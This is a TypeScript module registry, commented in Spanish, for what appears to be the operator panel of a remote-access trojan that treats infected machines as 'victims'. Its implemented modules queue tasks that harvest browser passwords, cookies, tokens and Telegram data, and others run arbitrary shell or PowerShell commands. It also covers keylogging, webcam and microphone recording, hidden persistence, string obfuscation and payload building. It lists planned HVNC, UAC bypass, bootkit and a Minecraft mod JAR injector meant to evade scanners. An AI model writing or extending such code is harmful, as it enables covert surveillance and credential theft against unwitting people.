/**
 * Registro único de módulos del panel de operación remota.
 *
 * Este archivo es la ÚNICA fuente de verdad del catálogo de módulos. De él se
 * derivan: el menú contextual jerárquico, la resolución de la tarea a encolar,
 * el modal de resultado y el histórico reabrible. Para añadir un módulo basta
 * con insertar una entrada aquí; la UI no se toca (§5.3 y §8).
 *
 * Integración con el cliente (protocolo v1 / contrato congelado):
 *   - Las tareas se encolan con POST /api/console/tasks
 *     ({victim_ids, name, params, timeout_sec}).
 *   - Los nombres de tarea válidos son los del contrato del agente:
 *     shell, harvest, files, monitor, webcam, mic, agent, screenshot, file_pull…
 *   - Los resultados llegan a task.result / task.error y se consultan con
 *     GET /api/console/tasks?victim=<id>&limit=N.
 *   - Los artefactos binarios se vinculan por taskId y se sirven con
 *     GET /api/console/tasks/:id/artifacts + /artifacts/:id/file?path=<ruta>.
 *   - Todo lo que dependa de una funcionalidad que el agente instalado no tenga
 *     se marca como `implemented: false`: el módulo sigue visible y seleccionable
 *     (el menú lista el 100 % del catálogo), pero al ejecutarse devuelve un modal
 *     con el código y el motivo exactos del fallo y opción de reintentar.
 *
 * Puntos que dependen del protocolo del cliente están anotados con `PROTOCOLO`.
 *
 * Nota de seguridad/OPSEC: este registro solo describe lo que el PANEL puede
 * pedir. Nunca contiene credenciales, claves ni rutas de instalación.
 */

import type { TaskName } from '@/lib/actions';
import type { Task, Victim } from '@/lib/types';
import { isWindows } from '@/lib/os';

/** Comparador de versiones puro (sin dependencia del servidor). */
function parseVersion(input: string): number[] {
  return input.split('.').map((part) => Number.parseInt(part, 10) || 0);
}

export function versionAtLeast(value: string | null | undefined, minimum: string): boolean {
  const left = parseVersion(value ?? '0.0.0');
  const right = parseVersion(minimum);
  for (let index = 0; index < Math.max(left.length, right.length); index += 1) {
    const diff = (left[index] ?? 0) - (right[index] ?? 0);
    if (diff !== 0) return diff > 0;
  }
  return true;
}

/* ══════════════════════════════════════════════════════════════════════════
   TIPOS
   ══════════════════════════════════════════════════════════════════════════ */

export type ModuleCategoryId =
  | 'sesion-control'
  | 'credenciales-recuperacion'
  | 'sistema-archivos'
  | 'captura-datos'
  | 'sigilo-evasion'
  | 'payload-despliegue';

/** Categoría extra (no es módulo): conserva las acciones clásicas del panel. */
export type MenuSectionId = ModuleCategoryId | 'acciones-panel';

export type ModuleKind =
  /** Tarea del agente (POST /tasks con name + params). */
  | 'task'
  /** Comando de consola del agente (name 'agent', params.command). */
  | 'agent'
  /** Shell del sistema (name 'shell', params.command). */
  | 'shell'
  /** Varias tareas del agente, encoladas en orden. */
  | 'multi'
  /** Se resuelve en el panel sin tarea (util local). */
  | 'local'
  /** Declarado en el catálogo, pero sin backend (se atenúa). */
  | 'none';

export type ModuleStep = { name: TaskName; params: Record<string, unknown>; timeoutSec: number };

export type ModuleEntry = {
  /** Identificador estable. Se usa en logs de auditoría y claves de historial. */
  id: string;
  category: ModuleCategoryId;
  label: string;
  description: string;
  kind: ModuleKind;
  /** Tarea del agente (kind 'task'). */
  task?: TaskName;
  /** Comando de consola del agente (kind 'agent'). */
  agentCommand?: string;
  /** Comando de shell (kind 'shell'). */
  shellCommand?: (victim: Victim, input?: string) => string;
  /** Varias tareas ejecutadas en orden (kind 'multi'). */
  steps?: ModuleStep[];
  /** Parámetros de la tarea, función de la víctima y la entrada del operador. */
  params?: (victim: Victim, input?: string) => Record<string, unknown>;
  timeoutSec?: number;
  /** Si existe, se pide una entrada de texto antes de ejecutar. */
  input?: { label: string; placeholder: string; multiline?: boolean; defaultValue?: string };
  /** Versión mínima del agente para que el módulo sea usable. */
  minAgent?: string;
  /** Solo disponible en Windows. */
  windowsOnly?: boolean;
  /** El resultado puede incluir archivos binarios (captura, audio, vídeo, zip). */
  binary?: boolean;
  /** Tipos MIME que admiten vista previa. */
  mime?: string[];
  /** Etiquetas de módulo de artefacto para localizar el archivo resultante. */
  artifactModules?: string[];
  /** Nombre de tarea usado para filtrar el histórico reabrible. */
  historyKey?: string;
  /** Ejecutable de verdad contra el cliente. false = atenuado + motivo + error al ejecutar. */
  implemented: boolean;
  /** Motivo de no disponibilidad (sobreescribe el motivo por defecto). */
  unsupportedReason?: (victim: Victim) => string;
  /** Fuente de datos en vivo que el modal sondea mientras está abierto. */
  liveSource?: 'keylogs';
  /** Resolución local (kind 'local'). Devuelve el resultado mostrado en el modal. */
  localExecute?: (input?: string) => { output: string; title: string; ext?: string; binary?: boolean };
};

export type ModuleCategory = { id: ModuleCategoryId; label: string };

/* ═══════════════════════════════════════════════════════════════════════════
   CATEGORÍAS (orden exacto del catálogo §2)
   ══════════════════════════════════════════════════════════════════════════ */

export const MODULE_CATEGORIES: ModuleCategory[] = [
  { id: 'sesion-control', label: 'Sesión y Control' },
  { id: 'credenciales-recuperacion', label: 'Credenciales y Recuperación' },
  { id: 'sistema-archivos', label: 'Sistema y Archivos' },
  { id: 'captura-datos', label: 'Captura y Datos' },
  { id: 'sigilo-evasion', label: 'Sigilo y Evasión' },
  { id: 'payload-despliegue', label: 'Payload y Despliegue' }
];

export const CATEGORY_LABELS: Record<ModuleCategoryId, string> = Object.fromEntries(
  MODULE_CATEGORIES.map((c) => [c.id, c.label])
) as Record<ModuleCategoryId, string>;

/* ═══════════════════════════════════════════════════════════════════════════
   CATÁLOGO DE MÓDULOS (23 entradas — §2)
   ══════════════════════════════════════════════════════════════════════════ */

/**
 * Codificación estable de una cadena para el visor local de ofuscación.
 * `btoa` falla con no-latin1, así que se convierte antes a UTF-8.
 */
function b64(text: string): string {
  const bytes = new TextEncoder().encode(text);
  let binary = '';
  for (const byte of bytes) binary += String.fromCharCode(byte);
  return btoa(binary);
}

export const MODULE_REGISTRY: ModuleEntry[] = [
  /* ══ 2.1 Sesión y Control ══ */
  {
    id: 'remote-desktop',
    category: 'sesion-control',
    label: 'Remote Desktop',
    description: 'Escritorio remoto de alto FPS con captura continua de pantalla.',
    kind: 'task',
    task: 'monitor',
    // PROTOCOLO: monitor devuelve `frames[{ts,data}]` en base64. El control de
    // ratón/teclado aún no viaja por el contrato v1; la captura sí es real.
    params: () => ({ seconds: 5, fps: 4, quality: 70, max_frames: 12 }),
    timeoutSec: 90,
    minAgent: '0.3.7',
    binary: true,
    mime: ['image/jpeg', 'image/png'],
    artifactModules: ['monitor', 'screenshot'],
    historyKey: 'monitor',
    implemented: true
  },
  {
    id: 'hvnc',
    category: 'sesion-control',
    label: 'Hidden VNC (HVNC)',
    description: 'Sesión de escritorio oculta en segundo plano; lanzar navegadores y apps sin que el usuario lo vea.',
    kind: 'none',
    implemented: false,
    unsupportedReason: () => 'El agente no expone un servidor de escritorio oculto (HVNC).'
  },
  {
    id: 'remote-shell',
    category: 'sesion-control',
    label: 'Remote Shell',
    description: 'Consola interactiva completa; ejecución de comandos y scripts.',
    kind: 'shell',
    input: { label: 'Comando', placeholder: 'ej. whoami', defaultValue: 'whoami' },
    shellCommand: (_victim, input) => (input && input.trim()) || 'whoami',
    timeoutSec: 60,
    implemented: true,
    historyKey: 'shell'
  },
  {
    id: 'embedded-browser',
    category: 'sesion-control',
    label: 'Embedded Browser',
    description: 'Navegación web a través de la máquina del cliente, saliendo por su IP.',
    kind: 'none',
    implemented: false,
    unsupportedReason: () => 'El cliente no implementa navegación web embebida.'
  },
  {
    id: 'remote-chat',
    category: 'sesion-control',
    label: 'Remote Chat',
    description: 'Envío de mensajes de chat al cliente (cuadro de mensaje del sistema).',
    kind: 'shell',
    input: { label: 'Mensaje', placeholder: 'Escribe el mensaje para el usuario', multiline: true },
    shellCommand: (victim, input) => {
      const text = String(input ?? '')
        .replace(/\\/g, '\\\\')
        .replace(/"/g, '\\"')
        .replace(/'/g, "''")
        .replace(/\r?\n/g, ' ');
      if (isWindows(victim.os)) {
        return `powershell -NoProfile -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\\"${text}\\",\\"SPC · ${victim.hostname}\\")"`;
      }
      return `sh -c "zenity --info --title='SPC · ${victim.hostname}' --text='${text}' 2>/dev/null || notify-send 'SPC · ${victim.hostname}' '${text}'"`;
    },
    timeoutSec: 60,
    implemented: true,
    historyKey: 'shell'
  },

  /* ══ 2.2 Credenciales y Recuperación ══ */
  {
    id: 'password-recovery',
    category: 'credenciales-recuperacion',
    label: 'Password Recovery',
    description: 'Extracción de credenciales guardadas en 25+ navegadores (Chromium, Firefox/Gecko, FileZilla y otros).',
    kind: 'task',
    task: 'harvest',
    // PROTOCOLO: `kind` solo existe a partir del agente 0.3.7; el servidor lo
    // elimina en silencio para agentes viejos y devuelve el harvest completo.
    params: () => ({ kind: 'browsers' }),
    timeoutSec: 180,
    minAgent: '0.3.7',
    artifactModules: ['harvest', 'seeds'],
    historyKey: 'harvest',
    implemented: true
  },
  {
    id: 'auto-recovery',
    category: 'credenciales-recuperacion',
    label: 'Auto Recovery',
    description: 'Recuperación automática de contraseñas, cookies, autofills, tokens y tdata de Telegram.',
    kind: 'task',
    task: 'harvest',
    params: () => ({}),
    timeoutSec: 300,
    minAgent: '0.3.7',
    artifactModules: ['harvest', 'seeds'],
    historyKey: 'harvest',
    implemented: true
  },
  {
    id: 'file-recovery',
    category: 'credenciales-recuperacion',
    label: 'File Recovery',
    description: 'Recuperación de archivos borrados escaneando memoria del sistema y reconstruyendo lo que ya no está en disco.',
    kind: 'none',
    implemented: false,
    unsupportedReason: () => 'No implementado: análisis de memoria para recuperar archivos borrados.'
  },

  /* ══ 2.3 Sistema y Archivos ══ */
  {
    id: 'file-manager',
    category: 'sistema-archivos',
    label: 'File Manager',
    description: 'Árbol de directorios: listar, subir, descargar, renombrar, borrar y comprimir.',
    kind: 'task',
    task: 'files',
    input: {
      label: 'Acción y ruta',
      placeholder: 'list C:\\ | delete C:\\tmp\\a.txt | rename a.txt -> b.txt | upload https://… -> C:\\tmp\\a.exe',
      defaultValue: 'list',
      multiline: true
    },
    // PROTOCOLO: `files` usa {action,path[,to,url]}. El árbol/CRUD completo vive
    // en la pestaña Ficheros del detalle; aquí se ejecuta la acción indicada y el
    // resultado queda registrado para reabrirlo. Requiere agente >= 0.3.7.
    params: (victim, input) => {
      const fallback = isWindows(victim.os) ? 'C:\\' : '/';
      const raw = (input ?? '').trim();
      const match = raw.match(/^(list|upload|mkdir|rename|delete|compress)\s*(.*)$/i);
      const action = (match?.[1]?.toLowerCase() ?? 'list') as 'list' | 'upload' | 'mkdir' | 'rename' | 'delete' | 'compress';
      const rest = match?.[2]?.trim() ?? '';
      if (action === 'rename') {
        const [from, to] = rest.split(/\s*->\s*/);
        return { action, path: from || fallback, to: to || '' };
      }
      if (action === 'upload') {
        const [url, destination] = rest.split(/\s*->\s*/);
        return { action, path: destination || '', url: url || '' };
      }
      return { action, path: rest || fallback };
    },
    timeoutSec: 120,
    minAgent: '0.3.7',
    binary: true,
    artifactModules: ['files'],
    historyKey: 'files',
    implemented: true
  },
  {
    id: 'process-manager',
    category: 'sistema-archivos',
    label: 'Process & Task Manager',
    description: 'Listado de procesos, finalización de tareas y entradas de arranque.',
    kind: 'shell',
    input: { label: 'Acción', placeholder: 'list | kill <pid> | startup', defaultValue: 'list' },
    // PROTOCOLO: se resuelve con shell nativo; `kill` usa taskkill/kill y
    // `startup` enumera las entradas de arranque del SO.
    shellCommand: (victim, input) => {
      const raw = (input ?? 'list').trim();
      const [verb, arg] = raw.split(/\s+/, 2);
      if (/^kill$/i.test(verb ?? '') && arg) {
        return isWindows(victim.os) ? `taskkill /PID ${arg} /F` : `kill -9 ${arg}`;
      }
      if (/^startup$/i.test(verb ?? '')) {
        return isWindows(victim.os)
          ? 'powershell -NoProfile -Command "Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location,User | Format-List"'
          : 'systemctl list-unit-files --state=enabled';
      }
      return isWindows(victim.os) ? 'tasklist /v' : 'ps aux';
    },
    timeoutSec: 60,
    implemented: true,
    historyKey: 'shell'
  },
  {
    id: 'remote-code-execution',
    category: 'sistema-archivos',
    label: 'Remote Code Execution',
    description: 'Ejecución de CMD, PowerShell o C# en la máquina, con ejecución oculta y compilación completa de payloads C#.',
    kind: 'shell',
    input: { label: 'Comando / script', placeholder: 'ej. ipconfig /all', multiline: true },
    shellCommand: (_victim, input) => (input && input.trim()) || 'whoami',
    timeoutSec: 120,
    implemented: true,
    historyKey: 'shell'
  },
  {
    id: 'tcp-connections',
    category: 'sistema-archivos',
    label: 'TCP Connections',
    description: 'Tabla de conexiones TCP activas con direcciones locales/remotas, puertos y estados.',
    kind: 'shell',
    shellCommand: (victim) => (isWindows(victim.os) ? 'netstat -ano' : 'ss -tunap'),
    timeoutSec: 60,
    implemented: true,
    historyKey: 'shell'
  },

  /* ══ 2.4 Captura y Datos ══ */
  {
    id: 'offline-keylogger',
    category: 'captura-datos',
    label: 'Offline Keylogger',
    description: 'Captura de pulsaciones y estado del hook; `dump` vuelca el log completo.',
    kind: 'agent',
    // PROTOCOLO: el hook nativo se controla con `keys on|off|status|dump`.
    // La captura en vivo se consulta por /victims/:id/keylogs desde el detalle.
    agentCommand: 'keys status',
    input: { label: 'Acción del keylogger', placeholder: 'on | off | status | dump', defaultValue: 'status' },
    timeoutSec: 30,
    windowsOnly: true,
    liveSource: 'keylogs',
    historyKey: 'agent',
    implemented: true
  },
  {
    id: 'webcam-mic',
    category: 'captura-datos',
    label: 'Webcam & Microphone',
    description: 'Captura de webcam y grabación de audio (dos artefactos, en orden).',
    kind: 'multi',
    steps: [
      { name: 'webcam', params: {}, timeoutSec: 60 },
      { name: 'mic', params: { seconds: 10 }, timeoutSec: 25 }
    ],
    // PROTOCOLO: ambas tareas suben un artefacto (jpg / wav) y devuelven upload_id;
    // se vinculan a la tarea al llegar el resultado. Requieren ffmpeg en el cliente.
    minAgent: '0.3.7',
    binary: true,
    mime: ['image/jpeg', 'image/png', 'audio/wav', 'audio/mpeg', 'audio/ogg', 'audio/*'],
    artifactModules: ['webcam', 'mic'],
    historyKey: 'webcam',
    implemented: true
  },
  {
    id: 'geolocation',
    category: 'captura-datos',
    label: 'Geolocation',
    description: 'Localización mediante GPS y escaneo de SSID en redes locales.',
    kind: 'none',
    implemented: false,
    unsupportedReason: () => 'El cliente no expone GPS ni escaneo de SSID de redes locales.'
  },

  /* ══ 2.5 Sigilo y Evasión ══ */
  {
    id: 'obfuscation-engine',
    category: 'sigilo-evasion',
    label: 'Obfuscation Engine',
    description: 'Cifrado avanzado de cadenas: XOR indexado + Base64, reversible con la clave del motor.',
    kind: 'local',
    input: { label: 'Texto a ofuscar', placeholder: 'escribe la cadena aquí', multiline: true },
    localExecute: (input) => {
      const text = input ?? '';
      const xored = [...text]
        .map((ch, i) => String.fromCharCode(ch.codePointAt(0)! ^ 0x5a ^ (i % 17)))
        .join('');
      return {
        title: 'Resultado de ofuscación',
        output: [
          `Motor: XOR(0x5a + índice % 17) → UTF-8 → Base64`,
          `Original (${text.length} bytes): ${text}`,
          `Ofuscado: ${b64(xored)}`,
          '',
          'Para revertir: Base64 → UTF-8 → XOR(0x5a + índice % 17).'
        ].join('\n'),
        ext: 'txt'
      };
    },
    implemented: true
  },
  {
    id: 'persistence',
    category: 'sigilo-evasion',
    label: 'Persistence',
    description: 'Persistencia sin privilegios de administrador y oculta mediante rootkit.',
    kind: 'agent',
    // PROTOCOLO: `persist on` registra la tarea de logon; `persist off` la retira.
    agentCommand: 'persist on',
    timeoutSec: 120,
    historyKey: 'agent',
    implemented: true
  },
  {
    id: 'process-hiding',
    category: 'sigilo-evasion',
    label: 'Process Hiding',
    description: 'Ocultación del proceso ante Task Manager, Process Hacker y herramientas afines.',
    kind: 'none',
    implemented: false,
    unsupportedReason: () => 'No implementado: ocultación de procesos ante herramientas de análisis.'
  },
  {
    id: 'uac-bypass',
    category: 'sigilo-evasion',
    label: 'UAC Bypass',
    description: 'Evasión de UAC para ejecutar y elevar tareas silenciosamente.',
    kind: 'none',
    implemented: false,
    unsupportedReason: () => 'No implementado: evasión de control de cuentas de usuario.'
  },
  {
    id: 'bootkit',
    category: 'sigilo-evasion',
    label: 'Bootkit',
    description: 'Persistencia a bajo nivel en arranque y kernel, cargada antes de la inicialización del SO.',
    kind: 'none',
    implemented: false,
    unsupportedReason: () => 'No implementado: persistencia de arranque/kernel.'
  },

  /* ══ 2.6 Payload y Despliegue ══ */
  {
    id: 'builder',
    category: 'payload-despliegue',
    label: 'Builder',
    description: 'Generación rápida de payloads desde el panel.',
    kind: 'local',
    localExecute: () => ({
      title: 'Constructor de payloads',
      output: [
        'El constructor real vive en la sección Builds del panel.',
        'Ruta: /builds',
        '',
        'Genera el JAR con perfil lite/full, token de build y versión; el agente',
        'acepta el despliegue por el canal de actualización del contrato v1.'
      ].join('\n'),
      ext: 'txt'
    }),
    implemented: true
  },
  {
    id: 'binder',
    category: 'payload-despliegue',
    label: 'Binder',
    description: 'Vinculación del batch a cualquier ejecutable.',
    kind: 'none',
    implemented: false,
    unsupportedReason: () => 'No implementado: binder de ejecutables.'
  },
  {
    id: 'jar-injector',
    category: 'payload-despliegue',
    label: 'Jar Injector',
    description: 'Inyección del batch en cualquier mod de Minecraft sin romper la funcionalidad del mod ni activar escáneres.',
    kind: 'none',
    implemented: false,
    unsupportedReason: () => 'No implementado: inyector de JAR para mods de Minecraft.'
  }
];

/* ═══════════════════════════════════════════════════════════════════════════
   ÍNDICES Y HELPERS
   ═══════════════════════════════════════════════════════════════════════════ */

export const MODULES_BY_ID = new Map(MODULE_REGISTRY.map((m) => [m.id, m]));

export function modulesByCategory(category: ModuleCategoryId): ModuleEntry[] {
  return MODULE_REGISTRY.filter((m) => m.category === category);
}

export type ModuleAvailability = {
  ok: boolean;
  reason: string | null;
  status: 'idle' | 'running' | 'done' | 'error';
  lastTask: Task | null;
  history: Task[];
};

/**
 * Disponibilidad de un módulo para una víctima concreta.
 *
 * Ningún módulo se oculta: si no es usable se devuelve atenuado con motivo.
 * Los puntos que dependen del protocolo del cliente están marcados.
 */
export function moduleAvailability(entry: ModuleEntry, victim: Victim, tasks: Task[]): ModuleAvailability {
  // 1. No hay backend implementado en el panel/agente.
  if (!entry.implemented) {
    return {
      ok: false,
      reason: entry.unsupportedReason ? entry.unsupportedReason(victim) : 'Módulo no implementado.',
      status: 'idle',
      lastTask: null,
      history: []
    };
  }

  // 2. Restricciones del cliente (protocolo): versión mínima, SO, socket.
  if (entry.windowsOnly && !isWindows(victim.os)) {
    return { ok: false, reason: 'Solo Windows.', status: 'idle', lastTask: null, history: [] };
  }
  if (entry.minAgent && !versionAtLeast(victim.agentVersion, entry.minAgent)) {
    return {
      ok: false,
      reason: `Requiere agente ${entry.minAgent} (actual: ${victim.agentVersion || 'desconocida'}).`,
      status: 'idle',
      lastTask: null,
      history: []
    };
  }
  if (!victim.socket && entry.kind !== 'local') {
    return {
      ok: false,
      reason: 'El equipo no tiene socket de control. La tarea no se encolará hasta que vuelva.',
      status: 'idle',
      lastTask: null,
      history: []
    };
  }

  // 3. Histórico del módulo para este cliente (estado y reapertura).
  const historyKey = entry.historyKey ?? entry.task;
  const history = historyKey
    ? tasks
        .filter((t) => t.name === historyKey && t.victimId === victim.id)
        .sort((a, b) => b.createdAt.localeCompare(a.createdAt))
        .slice(0, 25)
    : [];
  const last = history[0] ?? null;
  let status: ModuleAvailability['status'] = 'idle';
  if (last && (last.status === 'queued' || last.status === 'running')) status = 'running';
  else if (last?.status === 'done') status = 'done';
  else if (last?.status === 'error') status = 'error';

  return { ok: true, reason: null, status, lastTask: last, history };
}

/**
 * Resuelve los pasos de tarea a encolar para un módulo. Lanza si el módulo no
 * es ejecutable (llamar solo después de availability.ok === true).
 */
export function resolveSteps(entry: ModuleEntry, victim: Victim, input?: string): ModuleStep[] {
  if (entry.kind === 'multi') {
    if (!entry.steps || entry.steps.length === 0) throw new Error('multi_steps_missing');
    return entry.steps;
  }
  if (entry.kind === 'task') {
    if (!entry.task) throw new Error('task_missing');
    return [
      {
        name: entry.task,
        params: (entry.params ?? (() => ({})))(victim, input),
        timeoutSec: entry.timeoutSec ?? 120
      }
    ];
  }
  if (entry.kind === 'agent') {
    if (!entry.agentCommand) throw new Error('agent_command_missing');
    // PROTOCOLO: el input opcional permite `keys on/off/dump`, `persist off`, etc.
    const command = input && input.trim() ? input.trim() : entry.agentCommand;
    return [{ name: 'agent', params: { command }, timeoutSec: entry.timeoutSec ?? 60 }];
  }
  if (entry.kind === 'shell') {
    if (!entry.shellCommand) throw new Error('shell_command_missing');
    return [{ name: 'shell', params: { command: entry.shellCommand(victim, input) }, timeoutSec: entry.timeoutSec ?? 60 }];
  }
  throw new Error(`module_not_runnable:${entry.id}`);
}

/** Codifica una cadena para nombre de fichero seguro. */
export function slugify(value: string): string {
  return (
    String(value)
      .normalize('NFD')
      .replace(/[\u0300-\u036f]/g, '')
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, '_')
      .replace(/^_+|_+$/g, '')
      .slice(0, 40) || 'modulo'
  );
}

/** `modulo_host_timestamp.ext` (§3.3). */
export function resultFileName(entry: ModuleEntry, hostname: string, ext: string): string {
  const stamp = new Date().toISOString().replace(/[-:]/g, '').slice(0, 15);
  return `${slugify(entry.label)}_${slugify(hostname || 'host')}_${stamp}.${ext}`;
}

/** ¿El MIME permite vista previa? */
export function canPreview(mime: string | undefined): boolean {
  if (!mime) return false;
  return /^(image|audio|video)\//.test(mime) || mime === 'text/plain' || mime === 'application/json';
}
